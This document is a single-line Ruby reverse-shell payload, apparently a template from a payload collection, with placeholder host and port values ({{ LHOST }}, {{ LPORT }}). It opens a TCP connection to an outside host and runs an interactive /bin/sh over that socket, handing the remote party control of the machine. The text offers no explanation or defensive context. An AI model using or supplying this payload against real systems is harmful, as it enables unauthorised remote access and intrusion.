require 'socket';f=TCPSocket.open("{{ LHOST }}",{{ LPORT }}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
